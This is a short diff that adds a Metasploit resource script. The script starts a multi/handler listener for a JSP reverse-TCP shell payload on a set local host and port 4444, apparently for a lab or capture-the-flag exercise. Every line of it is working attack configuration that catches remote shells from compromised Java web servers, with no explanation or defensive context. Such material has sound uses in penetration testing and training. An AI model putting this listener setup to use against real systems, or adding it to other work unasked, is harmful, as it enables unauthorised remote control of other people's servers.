@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload java/jsp_shell_reverse_tcp
+set LHOST 10.10.10.161
+set LPORT 4444
+exploit
